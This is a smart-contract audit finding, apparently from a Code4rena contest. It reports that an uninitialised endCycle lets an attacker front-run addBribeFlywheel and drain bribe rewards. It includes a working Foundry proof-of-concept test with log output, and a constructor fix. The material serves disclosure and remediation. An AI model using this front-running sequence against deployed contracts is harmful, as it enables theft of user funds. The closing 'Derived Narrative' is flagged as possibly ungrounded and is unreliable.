---
id: 18591
severity: "High"
---

# A malicious user can front-run Gauges’s call `addBribeFlywheel` to steal bribe rewards

## Description

When the Gauge in the initial setup and flywheel is created and added to the gauge via `addBribeFlywheel`, a malicious user can front-run this to steal rewards. This could happen due to the un-initialized `endCycle` inside the `FlywheelAcummulatedRewards` contract.

## Proof of Concept

Consider this scenario :

  1. Gauge is first created, then an admin deposit of 100 eth is sent to depot reward.
  2. FlyWheel is also created, using `FlywheelBribeRewards` inherent in the `FlywheelAcummulatedRewards\` implementation.
  3. A malicious attacker has `addBribeFlywheel` that is about to be called by the owner and front-run it by calling `incrementGauge` (a huge amount of gauge token for this gauge).
  4. The call `addBribeFlywheel` is executed.
  5. Now, a malicious user can trigger `accrueBribes` and claim the reward.
  6. The bribe rewards are now stolen and a malicious user can immediately decrement their gauge from this contract.

All of this is possible, because `endCycle` is not initialized inside `FlywheelAcummulatedRewards` when first created:
```solidity
    abstract contract FlywheelAcummulatedRewards is BaseFlywheelRewards, IFlywheelAcummulatedRewards {
        using SafeCastLib for uint256;

        /*//////////////////////////////////////////////////////////////
                            REWARDS CONTRACT STATE
        //////////////////////////////////////////////////////////////*/

        /// @inheritdoc IFlywheelAcummulatedRewards
        uint256 public immutable override rewardsCycleLength;

        /// @inheritdoc IFlywheelAcummulatedRewards
        uint256 public override endCycle; // NOTE INITIALIZED INSIDE CONSTRUCTOR

        /**
         * @notice Flywheel Instant Rewards constructor.
         *  @param _flywheel flywheel core contract
         *  @param _rewardsCycleLength the length of a rewards cycle in seconds
         */
        constructor(FlywheelCore _flywheel, uint256 _rewardsCycleLength) BaseFlywheelRewards(_flywheel) {
            rewardsCycleLength = _rewardsCycleLength;
        }
        ...

    }
```
So right after it is created and attached to the gauge, the distribution of rewards can be called immediately via `accrueBribes` inside the gauge. If no previous user put their gauge tokens into this gauge contract, rewards can easily drained.

Foundry PoC (add this test inside `BaseV2GaugeTest.t.sol`):
```solidity
        function testAccrueAndClaimBribesAbuse() external {
            address alice = address(0xABCD);
            MockERC20 token = new MockERC20("test token", "TKN", 18);
            FlywheelCore flywheel = createFlywheel(token);
            FlywheelBribeRewards bribeRewards = FlywheelBribeRewards(
                address(flywheel.flywheelRewards())
            );
            gaugeToken.setMaxDelegates(1);
            token.mint(address(depot), 100 ether);

            // ALICE SEE THAT THIS IS NEW GAUGE, about to add new NEW FLYWHEEL REWARDS

            // alice put a lot of his hermes or could also get from flash loan
            hermes.mint(alice, 100e18);
            hevm.startPrank(alice);
            hermes.approve(address(gaugeToken), 100e18);
            gaugeToken.mint(alice, 100e18);
            gaugeToken.delegate(alice);
            gaugeToken.incrementGauge(address(gauge), 100e18);
            console.log("hermes total supply");
            console.log(hermes.totalSupply());
            hevm.stopPrank();
            // NEW BRIBE FLYWHEEL IS ADDED
            hevm.expectEmit(true, true, true, true);
            emit AddedBribeFlywheel(flywheel);
            gauge.addBribeFlywheel(flywheel);
            // ALICE ACCRUE BRIBES
            gauge.accrueBribes(alice);
            console.log("bribe rewards balance before claim : ");
            console.log(token.balanceOf(address(bribeRewards)));

            flywheel.claimRewards(alice);
            console.log("bribe rewards balance after claim : ");
            console.log(token.balanceOf(address(bribeRewards)));

            console.log("alice rewards balance : ");
            console.log(token.balanceOf(alice));
            // after steal reward, alice could just disengage from the gauge, and look for another new gauge with new flywheel
            hevm.startPrank(alice);
            gaugeToken.decrementGauge(address(gauge), 100e18);
            hevm.stopPrank();
        }
```
PoC log output:
```
      bribe rewards balance before claim : 
      100000000000000000000
      bribe rewards balance after claim : 
      0
      alice rewards balance : 
      100000000000000000000
```

## Recommendation

Add initialized `endCycle` inside `FlywheelAcummulatedRewards`:
```solidity
        constructor(
            FlywheelCore _flywheel,
            uint256 _rewardsCycleLength
        ) BaseFlywheelRewards(_flywheel) {
            rewardsCycleLength = _rewardsCycleLength;
            endCycle = ((block.timestamp.toUint32() + rewardsCycleLength) /
                    rewardsCycleLength) * rewardsCycleLength;        
        }
```
The mitigation should take into account the following issue [#457](https://github.com/code-423n4/2023-05-maia-findings/issues/457). So the best solution would be to check if `endCycle` is zero. If it is, then zero rewards are accrued and `endCycle` is set to end of the epoch.

Upon second viewing, it seems the attack is in line with High severity.

Addressed [here](https://github.com/Maia-DAO/eco-c4-contest/tree/206-457).

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is that the FlywheelAcummulatedRewards contract does not initialise the endCycle variable during construction. Because endCycle remains zero, the first call to accrueBribes after a gauge is linked with a new bribe flywheel treats the current timestamp as being within an already finished rewards cycle, allowing any caller to immediately accrue the full amount of bribe tokens that were deposited by the protocol owner. A malicious actor can front‑run the owner’s transaction that calls addBribeFlywheel, first inflating their gauge balance with a large amount of gauge tokens, then after the flywheel is attached, invoke accrueBribes and claim the entire bribe pool before any honest participant has a chance to stake. The result is that the attacker walks away with the full reward amount while the legitimate gauge token holder sees their expected refund disappear. This can be triggered whenever a new gauge is created and a bribe flywheel is added without first initialising the rewards epoch; the condition is reproducible on any deployment that follows the same pattern. The issue was discovered during a manual audit and demonstrated with a Foundry test that shows the bribe token balance dropping from 100 ETH to zero after the attacker’s claim. The bug is subtle because the contract compiles without warnings and the missing initialisation does not revert; the logic that checks whether a cycle has ended simply reads a zero value, which the code interprets as “cycle already ended”, opening the window for immediate reward accrual. The proper fix is to initialise endCycle to the timestamp of the next cycle boundary in the constructor, or to add a guard that treats a zero endCycle as an inactive cycle and prevents any accrual until the first epoch is explicitly started. This class of bug belongs to the broader category of uninitialised state variables that break time‑based accounting, leading to reward‑drain attacks and violation of the protocol’s economic assumptions that rewards are distributed only after a full cycle has elapsed.
